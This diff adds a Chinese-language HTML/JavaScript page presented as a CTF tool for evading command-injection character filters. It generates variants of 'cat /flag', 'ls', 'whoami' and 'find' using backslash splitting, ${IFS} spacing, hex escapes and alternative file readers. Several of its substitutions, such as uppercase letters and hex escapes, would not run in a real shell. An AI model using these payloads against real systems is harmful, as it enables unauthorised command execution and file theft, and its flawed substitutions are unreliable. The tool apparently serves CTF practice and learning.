@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF命令执行绕过工具</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#3B82F6',
+                        secondary: '#10B981',
+                        danger: '#EF4444',
+                        dark: '#1E293B',
+                        light: '#F8FAFC'
+                    },
+                    fontFamily: {
+                        mono: ['Consolas', 'Monaco', 'monospace']
+                    }
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .content-auto {
+                content-visibility: auto;
+            }
+            .text-shadow {
+                text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            }
+            .transition-height {
+                transition: max-height 0.3s ease-out;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <header class="bg-gradient-to-r from-primary to-primary/80 text-white shadow-lg">
+        <div class="container mx-auto px-4 py-6">
+            <h1 class="text-[clamp(1.5rem,3vw,2.5rem)] font-bold text-shadow">
+                <i class="fa fa-shield mr-2"></i>CTF命令执行绕过工具
+            </h1>
+            <p class="mt-2 text-blue-100">分析过滤规则，生成可用命令</p>
+        </div>
+    </header>
+
+    <main class="container mx-auto px-4 py-8">
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            <!-- 左侧：输入区域 -->
+            <div class="lg:col-span-1">
+                <div class="bg-white rounded-xl shadow-md p-6 h-full">
+                    <h2 class="text-xl font-bold text-dark mb-4 flex items-center">
+                        <i class="fa fa-filter text-primary mr-2"></i>过滤规则设置
+                    </h2>
+                    
+                    <div class="mb-6">
+                        <label for="regexInput" class="block text-gray-700 mb-2 font-medium">过滤正则表达式</label>
+                        <div class="flex">
+                            <span class="inline-flex items-center px-3 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-500">/</span>
+                            <input 
+                                type="text" 
+                                id="regexInput" 
+                                class="flex-grow px-4 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-primary/50 focus:border-primary"
+                                placeholder="例如: [a-zA-Z0-9]"
+                                value="[a-zA-Z0-9]"
+                            >
+                            <span class="inline-flex items-center px-3 rounded-r-md border border-l-0 border-gray-300 bg-gray-50 text-gray-500">/</span>
+                        </div>
+                        <p class="text-sm text-gray-500 mt-1">输入用于过滤的正则表达式（不需要包含^和$，程序会自动添加）</p>
+                    </div>
+                    
+                    <div class="mb-6">
+                        <label class="block text-gray-700 mb-2 font-medium">匹配模式</label>
+                        <div class="flex space-x-4">
+                            <label class="inline-flex items-center">
+                                <input type="radio" name="matchMode" value="contains" checked class="form-radio text-primary">
+                                <span class="ml-2">包含禁用字符即过滤</span>
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <button id="analyzeBtn" class="w-full bg-primary hover:bg-primary/90 text-white font-medium py-2 px-4 rounded-lg transition duration-200 flex items-center justify-center">
+                        <i class="fa fa-search mr-2"></i>分析过滤规则
+                    </button>
+                </div>
+            </div>
+            
+            <!-- 右侧：结果区域 -->
+            <div class="lg:col-span-2">
+                <!-- 过滤分析结果 -->
+                <div class="bg-white rounded-xl shadow-md p-6 mb-8">
+                    <h2 class="text-xl font-bold text-dark mb-4 flex items-center">
+                        <i class="fa fa-bar-chart text-primary mr-2"></i>过滤分析结果
+                    </h2>
+                    
+                    <div id="analysisResult" class="hidden">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div>
+                                <h3 class="font-semibold text-gray-800 mb-2">被禁用的字符</h3>
+                                <div id="bannedChars" class="bg-gray-50 p-4 rounded-lg font-mono text-danger h-40 overflow-y-auto"></div>
+                            </div>
+                            <div>
+                                <h3 class="font-semibold text-gray-800 mb-2">允许的字符</h3>
+                                <div id="allowedChars" class="bg-gray-50 p-4 rounded-lg font-mono text-secondary h-40 overflow-y-auto"></div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div id="noAnalysis" class="text-center py-10 text-gray-500">
+                        <i class="fa fa-info-circle text-4xl mb-3"></i>
+                        <p>请输入过滤正则表达式并点击"分析过滤规则"</p>
+                    </div>
+                </div>
+                
+                <!-- 常用命令绕过 -->
+                <div class="bg-white rounded-xl shadow-md p-6 mb-8">
+                    <h2 class="text-xl font-bold text-dark mb-4 flex items-center">
+                        <i class="fa fa-terminal text-primary mr-2"></i>常用命令绕过方案
+                    </h2>
+                    
+                    <div id="commonCommands" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow">
+                            <h3 class="font-medium text-gray-800 mb-2">列出目录 (ls)</h3>
+                            <div id="lsBypass" class="font-mono text-sm text-gray-700 bg-gray-50 p-3 rounded">
+                                请先分析过滤规则
+                            </div>
+                        </div>
+                        
+                        <div class="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow">
+                            <h3 class="font-medium text-gray-800 mb-2">读取文件 (cat)</h3>
+                            <div id="catBypass" class="font-mono text-sm text-gray-700 bg-gray-50 p-3 rounded">
+                                请先分析过滤规则
+                            </div>
+                        </div>
+                        
+                        <div class="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow">
+                            <h3 class="font-medium text-gray-800 mb-2">查看用户 (whoami)</h3>
+                            <div id="whoamiBypass" class="font-mono text-sm text-gray-700 bg-gray-50 p-3 rounded">
+                                请先分析过滤规则
+                            </div>
+                        </div>
+                        
+                        <div class="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow">
+                            <h3 class="font-medium text-gray-800 mb-2">查找flag (find)</h3>
+                            <div id="findBypass" class="font-mono text-sm text-gray-700 bg-gray-50 p-3 rounded">
+                                请先分析过滤规则
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- 自定义命令 -->
+                <div class="bg-white rounded-xl shadow-md p-6">
+                    <h2 class="text-xl font-bold text-dark mb-4 flex items-center">
+                        <i class="fa fa-code text-primary mr-2"></i>自定义命令生成
+                    </h2>
+                    
+                    <div class="mb-4">
+                        <label for="customCmd" class="block text-gray-700 mb-2 font-medium">原始命令</label>
+                        <input 
+                            type="text" 
+                            id="customCmd" 
+                            class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary/50 focus:border-primary"
+                            placeholder="例如: cat /flag"
+                            value="cat /flag"
+                        >
+                    </div>
+                    
+                    <button id="generateCmdBtn" class="bg-secondary hover:bg-secondary/90 text-white font-medium py-2 px-6 rounded-lg transition duration-200 flex items-center">
+                        <i class="fa fa-magic mr-2"></i>生成绕过命令
+                    </button>
+                    
+                    <div id="customCmdResult" class="mt-4 hidden">
+                        <h3 class="font-semibold text-gray-800 mb-2">可能的绕过命令</h3>
+                        <div id="bypassCommands" class="font-mono text-sm bg-gray-50 p-4 rounded-lg max-h-40 overflow-y-auto"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-dark text-white py-8 mt-12">
+        <div class="container mx-auto px-4">
+            <div class="text-center">
+                <p>CTF命令执行绕过工具 &copy; 2023</p>
+                <p class="text-gray-400 text-sm mt-2">仅供学习和CTF比赛使用</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // 常用命令及其可能的绕过形式
+        const commonCommands = {
+            ls: ['ls', 'l\s', 'ls -la', 'ls -l', 'ls /', 'dir', 'ls${IFS}-la'],
+            cat: ['cat', 'c\at', 'ca\t', 'cat /flag', 'tac /flag', 'more /flag', 'less /flag', 'nl /flag', 'cat${IFS}/flag'],
+            whoami: ['whoami', 'who\ami', 'id', 'whoami${IFS}'],
+            find: ['find / -name flag', 'find${IFS}/-name${IFS}flag', 'find . -name "flag*"']
+        };
+
+        // 字符替换映射表 - 用于绕过过滤的常见替换
+        const charReplacements = {
+            'a': ['a', 'A', '${a}', '\\x61'],
+            'b': ['b', 'B', '\\x62'],
+            'c': ['c', 'C', '\\x63'],
+            'd': ['d', 'D', '\\x64'],
+            'e': ['e', 'E', '\\x65'],
+            'f': ['f', 'F', '\\x66'],
+            'g': ['g', 'G', '\\x67'],
+            'h': ['h', 'H', '\\x68'],
+            'i': ['i', 'I', '\\x69'],
+            'j': ['j', 'J', '\\x6a'],
+            'k': ['k', 'K', '\\x6b'],
+            'l': ['l', 'L', '\\x6c'],
+            'm': ['m', 'M', '\\x6d'],
+            'n': ['n', 'N', '\\x6e'],
+            'o': ['o', 'O', '\\x6f'],
+            'p': ['p', 'P', '\\x70'],
+            'q': ['q', 'Q', '\\x71'],
+            'r': ['r', 'R', '\\x72'],
+            's': ['s', 'S', '\\x73', '\\x20'],
+            't': ['t', 'T', '\\x74'],
+            'u': ['u', 'U', '\\x75'],
+            'v': ['v', 'V', '\\x76'],
+            'w': ['w', 'W', '\\x77'],
+            'x': ['x', 'X', '\\x78'],
+            'y': ['y', 'Y', '\\x79'],
+            'z': ['z', 'Z', '\\x7a'],
+            ' ': [' ', '${IFS}', '$IFS', '\\x20', '${IFS%??}'],
+            '/': ['/', '\\x2f', '${HOME:0:1}'],
+            '-': ['-', '\\x2d']
+        };
+
+        // 分析过滤规则
+        document.getElementById('analyzeBtn').addEventListener('click', function() {
+            const regexInput = document.getElementById('regexInput').value.trim();
+            if (!regexInput) {
+                alert('请输入正则表达式');
+                return;
+            }
+
+            try {
+                // 创建正则表达式，添加^和$以匹配整个字符串
+                const regex = new RegExp(`^${regexInput}$`);
+                
+                // 分析被禁用和允许的字符
+                analyzeCharacters(regex);
+                
+                // 显示分析结果
+                document.getElementById('noAnalysis').classList.add('hidden');
+                document.getElementById('analysisResult').classList.remove('hidden');
+                
+                // 生成常用命令的绕过方案
+                generateCommonCommandBypasses(regex);
+                
+            } catch (e) {
+                alert('无效的正则表达式: ' + e.message);
+            }
+        });
+
+        // 分析字符是否被禁用
+        function analyzeCharacters(regex) {
+            // 测试常见字符集
+            const testChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-. /\\[]{}()<>!@#$%^&*+=:;"\'?|`~';
+            
+            const bannedChars = [];
+            const allowedChars = [];
+            
+            for (const char of testChars) {
+                if (regex.test(char)) {
+                    bannedChars.push(char);
+                } else {
+                    allowedChars.push(char);
+                }
+            }
+            
+            // 显示结果
+            document.getElementById('bannedChars').textContent = bannedChars.length > 0 ? bannedChars.join(' ') : '无禁用字符';
+            document.getElementById('allowedChars').textContent = allowedChars.length > 0 ? allowedChars.join(' ') : '无允许字符';
+            
+            return { bannedChars, allowedChars };
+        }
+
+        // 生成常用命令的绕过方案
+        function generateCommonCommandBypasses(regex) {
+            // 为每个常用命令生成可能的绕过方案
+            for (const [cmdName, cmdVariants] of Object.entries(commonCommands)) {
+                const validVariants = [];
+                
+                for (const variant of cmdVariants) {
+                    // 检查变体是否包含任何被禁用的字符
+                    let isValid = true;
+                    for (const char of variant) {
+                        if (regex.test(char)) {
+                            isValid = false;
+                            break;
+                        }
+                    }
+                    
+                    if (isValid) {
+                        validVariants.push(variant);
+                    }
+                }
+                
+                // 如果没有找到有效的变体，尝试生成替代方案
+                if (validVariants.length === 0) {
+                    for (const variant of cmdVariants) {
+                        const bypass = generateBypassCommand(variant, regex);
+                        if (bypass) {
+                            validVariants.push(bypass);
+                        }
+                    }
+                }
+                
+                // 显示结果
+                const element = document.getElementById(`${cmdName}Bypass`);
+                if (validVariants.length > 0) {
+                    element.innerHTML = validVariants.map(v => `<div class="mb-1">${v}</div>`).join('');
+                } else {
+                    element.textContent = '未找到可用的绕过方案';
+                    element.classList.add('text-danger');
+                }
+            }
+        }
+
+        // 生成自定义命令的绕过方案
+        document.getElementById('generateCmdBtn').addEventListener('click', function() {
+            const regexInput = document.getElementById('regexInput').value.trim();
+            const customCmd = document.getElementById('customCmd').value.trim();
+            
+            if (!regexInput) {
+                alert('请先输入并分析过滤规则');
+                return;
+            }
+            
+            if (!customCmd) {
+                alert('请输入自定义命令');
+                return;
+            }
+            
+            try {
+                const regex = new RegExp(`^${regexInput}$`);
+                const bypasses = [];
+                
+                // 首先检查原始命令是否有效
+                let isOriginalValid = true;
+                for (const char of customCmd) {
+                    if (regex.test(char)) {
+                        isOriginalValid = false;
+                        break;
+                    }
+                }
+                
+                if (isOriginalValid) {
+                    bypasses.push(`原始命令 (有效): ${customCmd}`);
+                }
+                
+                // 尝试生成绕过命令
+                const bypass = generateBypassCommand(customCmd, regex);
+                if (bypass) {
+                    bypasses.push(`替换绕过: ${bypass}`);
+                }
+                
+                // 尝试使用其他命令替代
+                const alternatives = getAlternativeCommands(customCmd);
+                for (const alt of alternatives) {
+                    let isValid = true;
+                    for (const char of alt) {
+                        if (regex.test(char)) {
+                            isValid = false;
+                            break;
+                        }
+                    }
+                    if (isValid) {
+                        bypasses.push(`替代命令: ${alt}`);
+                    }
+                }
+                
+                // 显示结果
+                const resultElement = document.getElementById('bypassCommands');
+                if (bypasses.length > 0) {
+                    resultElement.innerHTML = bypasses.map(b => `<div class="mb-2">${b}</div>`).join('');
+                    document.getElementById('customCmdResult').classList.remove('hidden');
+                } else {
+                    resultElement.textContent = '未找到可用的绕过方案';
+                    resultElement.classList.add('text-danger');
+                    document.getElementById('customCmdResult').classList.remove('hidden');
+                }
+                
+            } catch (e) {
+                alert('无效的正则表达式: ' + e.message);
+            }
+        });
+
+        // 生成绕过命令
+        function generateBypassCommand(command, regex) {
+            let bypass = '';
+            
+            for (const char of command) {
+                // 检查字符是否被禁用
+                if (regex.test(char)) {
+                    // 尝试找到替代字符
+                    let found = false;
+                    
+                    if (char in charReplacements) {
+                        for (const replacement of charReplacements[char]) {
+                            // 检查替换是否有效
+                            let isReplacementValid = true;
+                            for (const c of replacement) {
+                                if (regex.test(c)) {
+                                    isReplacementValid = false;
+                                    break;
+                                }
+                            }
+                            
+                            if (isReplacementValid) {
+                                bypass += replacement;
+                                found = true;
+                                break;
+                            }
+                        }
+                    }
+                    
+                    if (!found) {
+                        // 找不到替代字符，无法生成绕过命令
+                        return null;
+                    }
+                } else {
+                    // 字符未被禁用，直接使用
+                    bypass += char;
+                }
+            }
+            
+            return bypass;
+        }
+
+        // 获取命令的替代方案
+        function getAlternativeCommands(command) {
+            const alternatives = [];
+            
+            // 常见命令的替代方案
+            if (command.startsWith('cat ')) {
+                const file = command.slice(4);
+                alternatives.push(`tac ${file}`);
+                alternatives.push(`more ${file}`);
+                alternatives.push(`less ${file}`);
+                alternatives.push(`nl ${file}`);
+                alternatives.push(`head ${file}`);
+                alternatives.push(`tail ${file}`);
+                alternatives.push(`od ${file}`);
+                alternatives.push(`sed '' ${file}`);
+                alternatives.push(`awk '{print}' ${file}`);
+            }
+            
+            if (command === 'ls' || command.startsWith('ls ')) {
+                alternatives.push('dir');
+                alternatives.push('echo *');
+                alternatives.push('ls -l');
+                alternatives.push('ls -la');
+            }
+            
+            if (command === 'whoami') {
+                alternatives.push('id');
+                alternatives.push('echo $USER');
+                alternatives.push('printenv USER');
+            }
+            
+            return alternatives;
+        }
+    </script>
+</body>
+</html>
